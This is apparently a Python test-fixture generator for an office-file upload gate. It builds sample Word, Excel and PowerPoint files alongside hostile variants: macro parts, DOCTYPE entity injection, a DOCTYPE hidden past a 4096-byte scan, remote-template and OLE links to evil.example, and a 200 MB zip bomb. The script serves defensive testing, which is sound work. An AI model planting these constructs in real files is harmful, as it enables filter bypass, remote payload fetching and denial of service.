"""Create test .docx/.xlsx files plus hostile ones for the gate."""
import io, os, zipfile
from docx import Document
from docx.shared import Pt
from openpyxl import Workbook
from openpyxl.styles import Font, PatternFill, Border, Side, Alignment

out = os.path.join(os.path.dirname(__file__), 'fixtures')
os.makedirs(out, exist_ok=True)

d = Document()
d.add_heading('The Agora of Athens', 0)
p = d.add_paragraph('The agora was the heart of the ancient city: a marketplace and meeting ground.')
p.runs[0].font.size = Pt(12)
t = d.add_table(rows=3, cols=2)
t.style = 'Table Grid'
for i, (a, b) in enumerate([('Site', 'Why go'), ('Stoa of Attalos', 'Agora museum'), ('Temple of Hephaestus', 'Well preserved')]):
    t.cell(i, 0).text = a; t.cell(i, 1).text = b
d.add_paragraph('Second paragraph with bold text.').runs[0].bold = True
d.save(os.path.join(out, 'sample.docx'))

# Multi-page document for tests/print_check.py (Print / PDF must emit every page with its text).
dl = Document()
dl.add_heading('Long document', 0)
for i in range(1, 121):
    dl.add_paragraph(f'Paragraph {i}. ' + 'The quick brown fox jumps over the lazy dog. ' * 12)
dl.save(os.path.join(out, 'long.docx'))

wb = Workbook()
ws = wb.active
ws.title = 'Ledger'
ws.append(['Goods', 'Amphorae', 'Price', 'Total'])
for g, q, pr in [('Olive oil', 40, 12), ('Wine', 25, 18), ('Figs', 60, 4)]:
    ws.append([g, q, pr])
for r in range(2, 5):
    ws[f'D{r}'] = f'=B{r}*C{r}'
ws['A5'] = 'Total'; ws['D5'] = '=SUM(D2:D4)'
ws['A1'].font = Font(bold=True, color='FFFFFF'); ws['A1'].fill = PatternFill('solid', fgColor='4E5B23')
ws['D5'].border = Border(top=Side(style='double'))
ws['A7'] = 'Merged title'; ws.merge_cells('A7:D7'); ws['A7'].alignment = Alignment(horizontal='center')
ws.column_dimensions['A'].width = 22
ws.freeze_panes = 'A2'
ws2 = wb.create_sheet('Suppliers'); ws2['A1'] = 'Name'; ws2['B1'] = 'Since'
import datetime; ws2['B2'] = datetime.date(2024, 3, 15); ws2['A2'] = 'Kostas'
ws2['C2'] = '=_xlfn.CONCAT(A2," ok")'
wb.save(os.path.join(out, 'sample.xlsx'))

def rezip(src, dst, mutate):
    zin = zipfile.ZipFile(src)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zout:
        items = {i.filename: zin.read(i.filename) for i in zin.infolist()}
        for name, data in mutate(items).items():
            zout.writestr(name, data)
    open(dst, 'wb').write(buf.getvalue())

# macro: vbaProject.bin inside a .docx
rezip(os.path.join(out, 'sample.docx'), os.path.join(out, 'macro.docx'), lambda it: {**it, 'word/vbaProject.bin': b'\x00' * 64})
# XXE / billion laughs in document.xml
def xxe(it):
    it = dict(it)
    it['word/document.xml'] = b'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "aaaa">]>' + it['word/document.xml'].split(b'?>', 1)[1]
    return it
rezip(os.path.join(out, 'sample.docx'), os.path.join(out, 'xxe.docx'), xxe)
# DOCTYPE hidden behind a >5000-byte prolog comment (older gate only looked at the first 4096 bytes)
def late_doctype(it):
    it = dict(it)
    body = it['word/document.xml'].split(b'?>', 1)[1]
    it['word/document.xml'] = (b'<?xml version="1.0" encoding="UTF-8"?><!--' + b'x' * 6000 + b'-->'
                               b'<!DOCTYPE x [<!ENTITY a "aaaa">]>' + body)
    return it
rezip(os.path.join(out, 'sample.docx'), os.path.join(out, 'late_doctype.docx'), late_doctype)
# remote template: settings.xml pulls an attached template from a remote URL
def with_settings_rels(target_mode, rel_type, target):
    def mutate(it):
        it = dict(it)
        it['word/settings.xml'] = it.get('word/settings.xml') or (
            b'<?xml version="1.0" encoding="UTF-8"?>'
            b'<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
            b' xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
            b'<w:attachedTemplate r:id="rId1"/></w:settings>')
        mode = f' TargetMode="{target_mode}"' if target_mode else ''
        it['word/_rels/settings.xml.rels'] = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            f'<Relationship Id="rId1" Type="{rel_type}" Target="{target}"{mode}/>'
            '</Relationships>').encode()
        return it
    return mutate
REL = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
rezip(os.path.join(out, 'sample.docx'), os.path.join(out, 'remote_template.docx'),
      with_settings_rels('External', REL + 'attachedTemplate', 'https://evil.example/t.dotm'))
# control: an ordinary external hyperlink relationship must still open
rezip(os.path.join(out, 'sample.docx'), os.path.join(out, 'ext_hyperlink.docx'),
      with_settings_rels('External', REL + 'hyperlink', 'https://example.org/agora'))
# xlsx renamed as docx
open(os.path.join(out, 'mismatch.docx'), 'wb').write(open(os.path.join(out, 'sample.xlsx'), 'rb').read())
# plain text renamed
open(os.path.join(out, 'fake.xlsx'), 'wb').write(b'hello, not a spreadsheet')
# zip bomb-ish: 200 MB of zeros compressed
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr('[Content_Types].xml', '<Types/>')
    z.writestr('xl/workbook.xml', '<workbook/>')
    z.writestr('xl/bomb.bin', b'\0' * (200 * 1024 * 1024))
open(os.path.join(out, 'bomb.xlsx'), 'wb').write(buf.getvalue())
# OLE (encrypted / legacy) header
open(os.path.join(out, 'protected.xlsx'), 'wb').write(bytes.fromhex('D0CF11E0A1B11AE1') + b'\0' * 504)
# disallowed extension
open(os.path.join(out, 'evil.xlsm'), 'wb').write(open(os.path.join(out, 'sample.xlsx'), 'rb').read())
# workbook with a chart (a part Abakion cannot keep)
from openpyxl.chart import BarChart, Reference
wbc = Workbook(); wsc = wbc.active
for row in [['Goods', 'Qty'], ['Oil', 40], ['Wine', 25], ['Figs', 60]]:
    wsc.append(row)
ch = BarChart(); ch.add_data(Reference(wsc, min_col=2, min_row=1, max_row=4), titles_from_data=True)
wsc.add_chart(ch, 'D2'); wbc.save(os.path.join(out, 'chart.xlsx'))
# hyperlink, hidden empty row, tab colour
wbl = Workbook(); wsl = wbl.active
wsl['A1'] = 'Agora'; wsl['A1'].hyperlink = 'https://example.org/agora'
wsl.row_dimensions[3].hidden = True; wsl['A4'] = 'x'; wsl.sheet_properties.tabColor = 'A4472A'
wbl.save(os.path.join(out, 'link.xlsx'))

# Rich Word file for tests/pdf_check.py: formatting, fonts, lists, a shaded table, a picture, a link,
# header/footer with a page field, a footnote, a rotated text-box shape and a page border.
import re as _re
from docx.shared import RGBColor as DRGB, Inches as DInches
from docx.enum.text import WD_ALIGN_PARAGRAPH, WD_COLOR_INDEX
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
from PIL import Image as _Img, ImageDraw as _Draw
rd = Document()
sec = rd.sections[0]
sec.header.paragraphs[0].text = 'Greek Office header'
fp = sec.footer.paragraphs[0]; fp.alignment = WD_ALIGN_PARAGRAPH.CENTER; fp.add_run('Page ')
for kind in ('begin', 'instr', 'separate', 'text', 'end'):
    run = fp.add_run()
    if kind == 'instr':
        it = OxmlElement('w:instrText'); it.set(qn('xml:space'), 'preserve'); it.text = ' PAGE '; run._r.append(it)
    elif kind == 'text':
        run.text = '1'
    else:
        fc = OxmlElement('w:fldChar'); fc.set(qn('w:fldCharType'), kind); run._r.append(fc)
rd.add_heading('Rich document', 0)
rp = rd.add_paragraph('Mixed formatting: ')
rp.add_run('bold ').bold = True
rp.add_run('italic ').italic = True
ru = rp.add_run('underlined '); ru.underline = True
rc = rp.add_run('red '); rc.font.color.rgb = DRGB(0xC0, 0x20, 0x20)
rh = rp.add_run('highlighted'); rh.font.highlight_color = WD_COLOR_INDEX.YELLOW
rp.add_run(' E=mc'); rs = rp.add_run('2'); rs.font.superscript = True
rp.add_run('[[FN]]')
rp.add_run(' Greek: Ἀθῆναι, ἀγορά.')
rj = rd.add_paragraph('Justified text. ' + 'The agora was the centre of athletic, artistic, spiritual and political life in the city. ' * 4)
rj.alignment = WD_ALIGN_PARAGRAPH.JUSTIFY
for fam in ('Times New Roman', 'Arial', 'Courier New'):
    rr = rd.add_paragraph().add_run(f'This line is set in {fam}.'); rr.font.name = fam
for t_ in ('First bullet', 'Second bullet'):
    rd.add_paragraph(t_, style='List Bullet')
for t_ in ('First step', 'Second step'):
    rd.add_paragraph(t_, style='List Number')
rt = rd.add_table(rows=3, cols=3); rt.style = 'Table Grid'
for i in range(3):
    for k in range(3):
        rt.cell(i, k).text = f'R{i+1}C{k+1}'
shd = OxmlElement('w:shd'); shd.set(qn('w:val'), 'clear'); shd.set(qn('w:fill'), 'D9E2F3')
rt.cell(0, 0)._tc.get_or_add_tcPr().append(shd)
im = _Img.new('RGB', (240, 120), (164, 71, 42)); _Draw.Draw(im).ellipse((20, 10, 220, 110), fill=(233, 199, 123))
ib2 = io.BytesIO(); im.save(ib2, 'PNG'); ib2.seek(0)
rd.add_paragraph('A picture:')
rd.add_picture(ib2, width=DInches(2.5))
rd.add_paragraph('[[SHAPE]]')
rd.add_page_break()
rd.add_paragraph('Second page text.')
tmp = io.BytesIO(); rd.save(tmp)
zr = zipfile.ZipFile(io.BytesIO(tmp.getvalue())); files = {n_: zr.read(n_) for n_ in zr.namelist()}
docx_xml = files['word/document.xml'].decode()
docx_xml = _re.sub(r'<w:r>(?:(?!<w:r>).)*?<w:t>\[\[FN\]\]</w:t></w:r>', '<w:r><w:rPr><w:vertAlign w:val="superscript"/></w:rPr><w:footnoteReference w:id="1"/></w:r>', docx_xml, flags=_re.S)
shape = ('<w:r><mc:AlternateContent><mc:Choice Requires="wps"><w:drawing><wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="3" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1"><wp:simplePos x="0" y="0"/><wp:positionH relativeFrom="column"><wp:posOffset>2743200</wp:posOffset></wp:positionH><wp:positionV relativeFrom="paragraph"><wp:posOffset>0</wp:posOffset></wp:positionV><wp:extent cx="2286000" cy="685800"/><wp:effectExtent l="0" t="0" r="0" b="0"/><wp:wrapTopAndBottom/><wp:docPr id="10" name="Text Box 10"/><wp:cNvGraphicFramePr/>'
         '<a:graphic><a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape"><wps:wsp><wps:cNvSpPr txBox="1"/><wps:spPr><a:xfrm rot="600000"><a:off x="0" y="0"/><a:ext cx="2286000" cy="685800"/></a:xfrm><a:prstGeom prst="rect"><a:avLst/></a:prstGeom><a:solidFill><a:srgbClr val="F1E3D8"/></a:solidFill><a:ln w="19050"><a:solidFill><a:srgbClr val="A4472A"/></a:solidFill></a:ln></wps:spPr>'
         '<wps:txbx><w:txbxContent><w:p><w:pPr><w:jc w:val="center"/></w:pPr><w:r><w:rPr><w:b/><w:color w:val="7E3420"/></w:rPr><w:t>Text inside a shape</w:t></w:r></w:p></w:txbxContent></wps:txbx><wps:bodyPr wrap="square" anchor="ctr"><a:noAutofit/></wps:bodyPr></wps:wsp></a:graphicData></a:graphic></wp:anchor></w:drawing></mc:Choice><mc:Fallback><w:t>shape</w:t></mc:Fallback></mc:AlternateContent></w:r>')
docx_xml = _re.sub(r'<w:r>(?:(?!<w:r>).)*?<w:t>\[\[SHAPE\]\]</w:t></w:r>', shape, docx_xml, flags=_re.S)
docx_xml = docx_xml.replace('<w:pgMar ', '<w:pgBorders w:offsetFrom="page"><w:top w:val="double" w:sz="6" w:space="24" w:color="A4472A"/><w:left w:val="double" w:sz="6" w:space="24" w:color="A4472A"/><w:bottom w:val="double" w:sz="6" w:space="24" w:color="A4472A"/><w:right w:val="double" w:sz="6" w:space="24" w:color="A4472A"/></w:pgBorders><w:pgMar ', 1)
root_end = docx_xml.index('>', docx_xml.index('<w:document'))
for pfx, uri in (('wps', 'http://schemas.microsoft.com/office/word/2010/wordprocessingShape'), ('a', 'http://schemas.openxmlformats.org/drawingml/2006/main'),
                 ('mc', 'http://schemas.openxmlformats.org/markup-compatibility/2006'), ('wp', 'http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing')):
    if f'xmlns:{pfx}=' not in docx_xml[:root_end]:
        docx_xml = docx_xml.replace('<w:document ', f'<w:document xmlns:{pfx}="{uri}" ', 1)
        root_end = docx_xml.index('>', docx_xml.index('<w:document'))
files['word/document.xml'] = docx_xml.encode()
W_NS = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main'
files['word/footnotes.xml'] = (f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:footnotes xmlns:w="{W_NS}">'
  '<w:footnote w:type="separator" w:id="-1"><w:p><w:r><w:separator/></w:r></w:p></w:footnote>'
  '<w:footnote w:type="continuationSeparator" w:id="0"><w:p><w:r><w:continuationSeparator/></w:r></w:p></w:footnote>'
  '<w:footnote w:id="1"><w:p><w:r><w:rPr><w:vertAlign w:val="superscript"/></w:rPr><w:footnoteRef/></w:r><w:r><w:t xml:space="preserve"> The footnote sits at the foot of the page.</w:t></w:r></w:p></w:footnote></w:footnotes>').encode()
files['word/_rels/document.xml.rels'] = files['word/_rels/document.xml.rels'].decode().replace('</Relationships>',
  '<Relationship Id="rIdFn1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footnotes" Target="footnotes.xml"/></Relationships>').encode()
files['[Content_Types].xml'] = files['[Content_Types].xml'].decode().replace('</Types>',
  '<Override PartName="/word/footnotes.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.footnotes+xml"/></Types>').encode()
with zipfile.ZipFile(os.path.join(out, 'rich.docx'), 'w', zipfile.ZIP_DEFLATED) as zo:
    for n_ in ['[Content_Types].xml'] + [n_ for n_ in files if n_ != '[Content_Types].xml']:
        zo.writestr(n_, files[n_])

# A blank page in the middle (two page breaks in a row), for Papyros's Delete page.
from docx.enum.text import WD_BREAK
bp = Document()
bp.add_paragraph('Alpha on page one.')
bp.add_paragraph().add_run().add_break(WD_BREAK.PAGE)
bp.add_paragraph().add_run().add_break(WD_BREAK.PAGE)
bp.add_paragraph('Beta after a blank page.')
bp.save(os.path.join(out, 'blank_page.docx'))

# ---- PowerPoint (Pinax) ----
from pptx import Presentation
from pptx.util import Inches, Pt as PPt, Emu
from pptx.dml.color import RGBColor
from pptx.enum.shapes import MSO_SHAPE, MSO_CONNECTOR
from pptx.chart.data import CategoryChartData
from pptx.enum.chart import XL_CHART_TYPE
from PIL import Image as PILImage, ImageDraw as PILDraw

prs = Presentation()
prs.slide_width, prs.slide_height = Inches(13.333), Inches(7.5)
L = {l.name: l for l in prs.slide_layouts}
s1 = prs.slides.add_slide(L['Title Slide'])
s1.shapes.title.text = 'The Agora of Athens'
s1.placeholders[1].text = 'A walk through the marketplace'
s2 = prs.slides.add_slide(L['Title and Content'])
s2.shapes.title.text = 'What stood there'
body = s2.placeholders[1].text_frame
body.text = 'Stoa of Attalos'
p2 = body.add_paragraph(); p2.text = 'Rebuilt in the 1950s'; p2.level = 1
p3 = body.add_paragraph(); r = p3.add_run(); r.text = 'Temple of '; r2 = p3.add_run(); r2.text = 'Hephaestus'
r2.font.bold = True; r2.font.color.rgb = RGBColor(0xA4, 0x47, 0x2A)
s2.notes_slide.notes_text_frame.text = 'Speaker notes for slide two.'
s3 = prs.slides.add_slide(L['Title Only'])
s3.shapes.title.text = 'Shapes and a picture'
box = s3.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(0.8), Inches(2), Inches(3.2), Inches(1.4))
box.fill.solid(); box.fill.fore_color.rgb = RGBColor(0x4E, 0x5B, 0x23); box.text_frame.text = 'Marketplace'
s3.shapes.add_shape(MSO_SHAPE.OVAL, Inches(4.6), Inches(2), Inches(2), Inches(1.4))
arrow = s3.shapes.add_shape(MSO_SHAPE.RIGHT_ARROW, Inches(7.2), Inches(2.2), Inches(2), Inches(1))
arrow.rotation = 15
line = s3.shapes.add_connector(MSO_CONNECTOR.STRAIGHT, Inches(0.8), Inches(4.2), Inches(5), Inches(4.2))
line.line.width = PPt(3)
ln = line.line._get_or_add_ln(); from lxml import etree
ln.append(etree.SubElement(ln, '{http://schemas.openxmlformats.org/drawingml/2006/main}tailEnd', type='triangle'))
img = PILImage.new('RGB', (300, 200), (164, 71, 42)); PILDraw.Draw(img).ellipse((40, 30, 260, 170), fill=(233, 199, 123))
ib = io.BytesIO(); img.save(ib, 'PNG'); ib.seek(0)
s3.shapes.add_picture(ib, Inches(9.6), Inches(4.4), Inches(3), Inches(2))
grp = s3.shapes.add_group_shape()
grp.shapes.add_shape(MSO_SHAPE.RECTANGLE, Inches(1), Inches(5), Inches(1.5), Inches(1))
grp.shapes.add_shape(MSO_SHAPE.ISOSCELES_TRIANGLE, Inches(2.8), Inches(5), Inches(1.5), Inches(1))
s4 = prs.slides.add_slide(L['Title Only'])
s4.shapes.title.text = 'A table and a chart'
tbl = s4.shapes.add_table(3, 3, Inches(0.6), Inches(1.8), Inches(6), Inches(1.6)).table
for i, row in enumerate([['Goods', 'Amphorae', 'Price'], ['Olive oil', '40', '12'], ['Wine', '25', '18']]):
    for j, v in enumerate(row):
        tbl.cell(i, j).text = v
cd = CategoryChartData(); cd.categories = ['Oil', 'Wine', 'Figs']; cd.add_series('Amphorae', (40, 25, 60))
s4.shapes.add_chart(XL_CHART_TYPE.COLUMN_CLUSTERED, Inches(7), Inches(1.8), Inches(5.5), Inches(4.5), cd)
s5 = prs.slides.add_slide(L['Blank'])
tb = s5.shapes.add_textbox(Inches(1), Inches(1), Inches(6), Inches(1)); tb.text_frame.text = 'Hidden slide'
s5._element.set('show', '0')
prs.save(os.path.join(out, 'sample.pptx'))

# hostile presentations
rezip(os.path.join(out, 'sample.pptx'), os.path.join(out, 'vba.pptx'), lambda it: {**it, 'ppt/vbaProject.bin': b'\x00' * 64})
def pptx_xxe(it):
    it = dict(it)
    it['ppt/presentation.xml'] = b'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "aaaa">]>' + it['ppt/presentation.xml'].split(b'?>', 1)[1]
    return it
rezip(os.path.join(out, 'sample.pptx'), os.path.join(out, 'xxe.pptx'), pptx_xxe)
def ole_link(it):
    it = dict(it)
    rels = it['ppt/slides/_rels/slide1.xml.rels'].decode()
    it['ppt/slides/_rels/slide1.xml.rels'] = rels.replace('</Relationships>',
        f'<Relationship Id="rId99" Type="{REL}oleObject" Target="file://evil.example/share/x.xlsx" TargetMode="External"/></Relationships>').encode()
    return it
rezip(os.path.join(out, 'sample.pptx'), os.path.join(out, 'ole_link.pptx'), ole_link)
open(os.path.join(out, 'macro.pptm'), 'wb').write(open(os.path.join(out, 'sample.pptx'), 'rb').read())
open(os.path.join(out, 'mismatch_pptx.docx'), 'wb').write(open(os.path.join(out, 'sample.pptx'), 'rb').read())
open(os.path.join(out, 'legacy.ppt'), 'wb').write(bytes.fromhex('D0CF11E0A1B11AE1') + b'\0' * 504)

print(sorted(os.listdir(out)))
